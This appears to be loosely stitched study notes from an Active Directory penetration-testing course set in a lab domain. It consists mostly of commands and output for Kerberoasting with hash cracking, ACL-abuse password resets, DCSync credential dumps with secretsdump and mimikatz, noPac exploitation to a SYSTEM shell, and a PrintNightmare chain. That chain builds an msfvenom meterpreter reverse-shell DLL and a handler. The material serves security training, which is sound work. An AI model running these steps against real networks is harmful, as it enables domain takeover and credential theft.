'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(\u0026(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' [*] Total kerberoastable users : 1 [*] SamAccountName : testspn [*] DistinguishedName : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL [*] ServicePrincipalName : testspn/kerberoast.inlanefreight.local [*] PwdLastSet : 2/27/2022 12:15:43 PM [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash Using the /nowrap Flag Kerberoasting - from Windows\nPS C:\\local\u003e .\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket cube111@local[/local]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... \u003cSNIP\u003e64bea80dc3608b6c8c14f244cbaa083443eb59d9ef3599fca72c6997c824b87cf7f7ef6621b3eaa5aa0119177fc480a20b82203081609e42748920274febb94c3826d57c78ad93f04400dc9626cf978225c51a889224e3ed9e3bfdf6a4d6998c16d414947f9e157cb1594b268be470d6fb489c2c6c56d2ad564959c5:welcome1$ Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, TGS-REP Hash.Target......: $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/ke...4959c5 Time.Started.....: Sun Feb 27 15:36:58 2022 (4 secs) Time.Estimated...: Sun Feb 27 15:37:02 2022 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 693.3 kH/s (5.41ms) @ Accel: AES-128/256 CRACKING\nChecking Supported Encryption Types Kerberoasting - from Windows\nPS C:\\local\u003e Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes serviceprincipalname msds-supportedencryptiontypes samaccountname -------------------- ----------------------------- -------------- testspn/kerberoast.inlanefreight.local 24 testspn Requesting a New Ticket Kerberoasting - from Windows\nPS C:\\local\u003e .\\Rubeus.exe kerberoast /user:testspn /nowrap [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. [*] Target User : testspn [*] Target Domain : INLANEFREIGHT.LOCAL [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(\u0026(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' [*] Total kerberoastable users : 1 [*] SamAccountName : testspn [*] DistinguishedName : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL [*] ServicePrincipalName : testspn/kerberoast.inlanefreight.local [*] PwdLastSet : 2/27/2022 12:15:43 PM [*] Supported ETypes : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 [*] Hash : $krb5tgs$18$testspn$IN cube111@local[/local]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... \u003cSNIP\u003e [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u003e s Session..........: hashcat Status...........: Running Hash.Name........: Kerberos 5, etype 18, TGS-REP Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53 Time.Started.....: Sun Feb 27 16:07:50 2022 (57 secs) Time.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8 Recovered........: 0/1 (0.00%) Digests Progress.........: 583680/14344385 (4.07%) Rejected.........: 0/583680 (0.00%) Restore.Point....: 583680/14344385 (4.07%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328 Candidates.#1....: skitzy -\u003e sammy\u003c3 Access Control List (ACL) Overview ACL Enumeration powerview\nPS C:\\local\u003e Find-InterestingDomainAcl ObjectDN : DC=INLANEFREIGHT,DC=LOCAL AceQualifier : AccessAllowed ActiveDirectoryRights : ExtendedRight ObjectAceType : ab721a53-1e2f-11d0-9819-00aa0040529b AceFlags : ContainerInherit AceType : AccessAllowedObject InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-5189 IdentityReferenceName : Exchange Windows Permissions IdentityReferenceDomain : INLANEFREIGHT.LOCAL IdentityReferenceDN : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=INLANE PS C:\\local\u003e Import-Module .\\PowerView.ps1 PS C:\\local\u003e $sid = Convert-NameToSid wley PS C:\\local\u003e Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid} ObjectDN : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-1176 ActiveDirectoryRights : ExtendedRight ObjectAceFlags : ObjectAceTypePresent ObjectAceType : 00299570-246d-11d0-a768-00aa006e0529 InheritedObjectAceType : 00000000-0000-0000-0000-000000000000 BinaryLength : 56 AceQualifier : AccessAllowed IsCallback : False OpaqueLength : 0 AccessMask : 256 SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-1181 AceType : AccessAllowedObject AceFlags : ContainerInherit IsInherited : False InheritanceFlags : ContainerInherit PropagationFlags : None AuditFlags : None PS C:\\local\u003e $adunnsid = Convert-NameToSid adunn PS C:\\local\u003e Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose AceQualifier : AccessAllowed ObjectDN : DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : ExtendedRight ObjectAceType : DS-Replication-Get-Changes-In-Filtered-Set ObjectSID : S-1-5-21-3842939050-3880317879-2865463114 InheritanceFlags : ContainerInherit BinaryLength : 56 AceType : AccessAllowedObject ObjectAceFlags : ObjectAceTypePresent IsCallback : False PropagationFlags : None SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-1164 AccessMask : 256 AuditFlags : None IsInherited : False AceFlags : ContainerInherit InheritedObjectAceType : All OpaqueLength : 0 AceQualifier : AccessAllowed ObjectDN : DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : ExtendedRight ObjectAceType : DS-Replication-Get-Changes ObjectSID : S-1-5-21-3842939050-3880317879-2865463114 InheritanceFlags : ContainerInherit BinaryLength : 56 AceType : AccessAllowedObject ObjectAceFlags : ObjectAceTypePresent IsCallback : False PropagationFlags : None SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-1164 AccessMask : 256 AuditFlags : None IsInherited : False AceFlags : ContainerInherit InheritedObjectAceType : All OpaqueLength : 0 active directorymodule\nPS C:\\local\u003e Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName \u003e ad_users.txt loop it\nPS C:\\local\u003e foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\local-student\\Desktop\\ad_users.txt\")) {get-acl \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}} Path : Microsoft.ActiveDirectory.Management.dll\\ActiveDirectory:://RootDSE/CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : ExtendedRight InheritanceType : All ObjectType : 00299570-246d-11d0-a768-00aa006e0529 Investigating the Help Desk Level 1 Group with Get-DomainGroup PS C:\\local\u003e Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof memberof -------- CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL Investigating the Information Technology Group PS C:\\local\u003e $itgroupsid = Convert-NameToSid \"Information Technology\" PS C:\\local\u003e Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose AceType : AccessAllowed ObjectDN : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : GenericAll OpaqueLength : 0 ObjectSID : S-1-5-21-3842939050-3880317879-2865463114-1164 InheritanceFlags : ContainerInherit BinaryLength : 36 IsInherited : False IsCallback : False PropagationFlags : None SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-4016 AccessMask : 983551 AuditFlags : None AceFlags : ContainerInherit AceQualifier : AccessAllowed ACL Abuse Tactics Use the wley user to change the password for the damundsen user ifl wey session is on\n‚úÖ Modified Command (no credential needed): powershell Copy Edit Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Verbose no session\nPS C:\\local\u003e $SecPassword = ConvertTo-SecureString '\u003cPASSWORD HERE\u003e' -AsPlainText -Force PS C:\\local\u003e $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) PS C:\\local\u003e $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force Changing the User‚Äôs Password ACL Abuse Tactics\nPS C:\\local\u003e cd C:\\Tools\\ PS C:\\local\u003e Import-Module .\\PowerView.ps1 PS C:\\local\u003e Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose VERBOSE: [Get-PrincipalContext] Using alternate credentials VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen' generic write\nAdding damundsen to the Help Desk Level 1 Group PS C:\\local\u003e Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose VERBOSE: [Get-PrincipalContext] Using alternate credentials VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1' Generic all\nCreating a Fake SPN ACL Abuse Tactics\nPS C:\\local\u003e Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (\u0026(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn)))) VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn' Kerberoasting with Rubeus ACL Abuse Tactics\nPS C:\\local\u003e .\\Rubeus.exe kerberoast /user:adunn /nowrap DCSync PS C:\\local\u003e $sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\" PS C:\\local\u003e Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl AceQualifier : AccessAllowed ObjectDN : DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : ExtendedRight SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-498 ObjectAceType : DS-Replication-Get-Changes AceQualifier : AccessAllowed ObjectDN : DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : ExtendedRight SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-516 ObjectAceType : DS-Replication-Get-Changes-All AceQualifier : AccessAllowed ObjectDN : DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : ExtendedRight SecurityIdentifier : S-1-5-21-3842939050-3880317879-2865463114-1164 ObjectAceType : DS-Replication-Get-Changes-In-Filtered-Set AceQualifier : AccessAllowed ObjectDN : DC=INLANEFREIGHT,DC=LOCAL ActiveDirectoryRights : ExtendedRight We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user \u003cUSERNAME\u003e to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account‚Äôs password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:\ncube111@local[/local]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation Password: [*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5 [*] Searching for NTDS.dit [*] Registry says NTDS.dit is at C:\\Windows\\NTDS\\ntds.dit. Calling vssadmin to get a copy. This might take some time [*] Using smbexec method for remote execution [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6 [*] Reading and decrypting hashes from \\\\172.16.5.5\\ADMIN$\\Temp\\HOLJALFD.tmp Viewing an Account with Reversible Encryption Password Storage Set Enumerating Further using Get-ADUser DCSync\nPS C:\\local\u003e Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl DistinguishedName : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL Enabled : True GivenName : Name : PROXYAGENT ObjectClass : user ObjectGUID : c72d37d9-e9ff-4e54-9afa-77775eaaf334 SamAccountName : proxyagent SID : S-1-5-21-3842939050-3880317879-2865463114-5222 Surname : userAccountControl : 640 UserPrincipalName : Checking for Reversible Encryption Option using Get-DomainUser DCSync\nPS C:\\local\u003e Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol samaccountname useraccountcontrol -------------- ------------------ proxyagent ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT Displaying the Decrypted Password DCSync\ncube111@local[/local]$ cat inlanefreight_hashes.ntds.cleartext proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT! Displaying the Decrypted Password DCSync\ncube111@local[/local]$ cat inlanefreight_hashes.ntds.cleartext proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT! Performing the Attack with Mimikatz PS C:\\local\u003e .\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator [DC] 'INLANEFREIGHT.LOCAL' will be the domain [DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'INLANEFREIGHT\\administrator' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : administrator User Principal Name : administrator@inlanefreight.local Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 10/27/2021 6:49:32 AM Object Security ID : S-1-5-21-3842939050-3880317879-2865463114-500 Object Relative ID : 500 Credentials: Hash NTLM: 88ad09182de639ccc6579eb0849751cf Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 4625fd0c31368ff4c255a3b876eaac3d \u003cSNIP\u003e Non-Privileged Access (non domain) Enumerate if the user in rdp local group (powerview)\nEnumerating the Remote Desktop Users Group Privileged Access\nPS C:\\local\u003e Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\" ComputerName : ACADEMY-EA-MS01 GroupName : Remote Desktop Users MemberName : INLANEFREIGHT\\Domain Users SID : S-1-5-21-3842939050-3880317879-2865463114-513 IsGroup : True IsDomain : UNKNOWN Checking the Domain Users Group‚Äôs Local Admin \u0026 Execution Rights using BloodHound Checking Remote Access Rights using BloodHound We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP.\nWe can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.\nCode: cypher\nWinRM (bloodhound) MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-\u003e(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-\u003e(c:Computer) RETURN p2 PS C:\\local\u003e $password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force PS C:\\local\u003e $cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password) PS C:\\local\u003e Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred [ACADEMY-EA-MS01]: PS C:\\Users\\forend\\Documents\u003e hostname ACADEMY-EA-MS01 [ACADEMY-EA-MS01]: PS C:\\Users\\forend\\Documents\u003e Exit-PSSession PS C:\\local\u003e Connecting to a Target with Evil-WinRM and Valid Credentials Privileged Access\ncube111@local[/local]$ evil-winrm -i 10.129.201.234 -u forend Enter Password: Evil-WinRM shell v3.3 SQL Server Admin MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-\u003e(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-\u003e(c:Computer) RETURN p2 cypher query\nMATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-\u003e(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-\u003e(c:Computer) RETURN p2 Enumerating MSSQL Instances with PowerUpSQL Privileged Access\nPS C:\\local\u003e cd .\\PowerUpSQL\\ PS C:\\local\u003e Import-Module .\\PowerUpSQL.ps1 PS C:\\local\u003e Get-SQLInstanceDomain ComputerName : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL Instance : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433 DomainAccountSid : 1500000521000170152142291832437223174127203170152400 DomainAccount : damundsen DomainAccountCn : Dana Amundsen Service : MSSQLSvc Spn : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433 LastLogon : 4/6/2022 11:59 AM PS C:\\local\u003e Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version' VERBOSE: 172.16.5.150,1433 : Connection Success. Column1 ------- Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ... Running mssqlclient.py Against the Target Privileged Access\ncube111@local[/local]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands xp_cmdshell whoami /priv output -------------------------------------------------------------------------------- NULL PRIVILEGES INFORMATION ---------------------- NULL Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled NULL Kerberos ‚ÄúDouble Hop‚Äù Problem in winrm So now, let‚Äôs set up a PSCredential object and try again. First, we set up our authentication.\nevil-winrm\nKerberos ‚ÄúDouble Hop‚Äù Problem\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents\u003e $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force |S-chain|-\u003c\u003e-127.0.0.1:9051-\u003c\u003e\u003c\u003e-172.16.8.50:5985-\u003c\u003e\u003c\u003e-OK |S-chain|-\u003c\u003e-127.0.0.1:9051-\u003c\u003e\u003c\u003e-172.16.8.50:5985-\u003c\u003e\u003c\u003e-OK *Evil-WinRM* PS C:\\Users\\backupadm\\Documents\u003e $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword) Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.\nKerberos ‚ÄúDouble Hop‚Äù Problem\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents\u003e get-domainuser -spn -credential $Cred | select samaccountname |S-chain|-\u003c\u003e-127.0.0.1:9051-\u003c\u003e\u003c\u003e-172.16.8.50:5985-\u003c\u003e\u003c\u003e-OK |S-chain|-\u003c\u003e-127.0.0.1:9051-\u003c\u003e\u003c\u003e-172.16.8.50:5985-\u003c\u003e\u003c\u003e-OK samaccountname -------------- azureconnect backupjob krbtgt mssqlsvc sqltest sqlqa sqldev mssqladm svc_sql sqlprod sapsso enter-pssession\nPS C:\\local\u003e Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities. WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be required. All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected. WSManConfig: Microsoft.WSMan.Management\\WSMan::localhost\\Plugin Type Keys Name ---- ---- ---- Container {Name=backupadmsess} backupadmsess Restart-Service WinRM Enter-PSSession -ComputerName DEV01 -ConfigurationName backupadmsess check for Zerologon or DCShadow.\nPetitPotam (MS-EFSRPC) NoPac (SamAccountName Spoofing) Scanning for NoPac Bleeding Edge Vulnerabilities\ncube111@local[/local]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap ‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà [*] Current ms-DS-MachineAccountQuota = 10 [*] Got TGT with PAC from 172.16.5.5. Ticket size 1484 [*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663 cube111@local[/local]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap ‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà [*] Current ms-DS-MachineAccountQuota = 10 [*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL [*] will try to impersonat administrator [*] Adding Computer Account \"WIN-LWJFQMAXRVN$\" [*] MachineAccount \"WIN-LWJFQMAXRVN$\" password = \u0026A#x8X^5iLva [*] Successfully added machine account WIN-LWJFQMAXRVN$ with password \u0026A#x8X^5iLva. [*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL [*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01 [*] Saving ticket in ACADEMY-EA-DC01.ccache [*] Resting the machine account to WIN-LWJFQMAXRVN$ [*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating administrator [*] Requesting S4U2self [*] Saving ticket in administrator.ccache [*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL [*] Rename ccache with target ... [*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$ [-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission. [*] Pls make sure your choice hostname and the -dc-ip are same machine !! [*] Exploiting.. [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u003e Using noPac to DCSync the Built-in Administrator Account cube111@local[/local]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator PrintNightmare Cloning the Exploit Bleeding Edge Vulnerabilities\ncube111@local[/local]$ git clone https://github.com/cube0x0/CVE-2021-1675.git pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install Enumerating for MS-RPRN Bleeding Edge Vulnerabilities\ncube111@local[/local]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol cube111@local[/local]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll \u003e backupscript.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of dll file: 8704 bytes Creating a Share with smbserver.py Bleeding Edge Vulnerabilities\ncube111@local[/local]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed Configuring \u0026 Starting MSF multi/handler Bleeding Edge Vulnerabilities\n[msf](Jobs:0 Agents:0) \u003e\u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) \u003e\u003e set PAYLOAD windows/x64/meterpreter/reverse_tcp PAYLOAD =\u003e windows/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) \u003e\u003e set LHOST 172.16.5.225 LHOST =\u003e 10.3.88.114 [msf](Jobs:0 Agents:0) exploit(multi/handler) \u003e\u003e set LPORT 8080 LPORT =\u003e 8080 [msf](Jobs:0 Agents:0) exploit(multi/handler) \u003e\u003e run [*] Started reverse TCP handler on 172.16.5.225:8080 cube111@local[/local]$ sudo 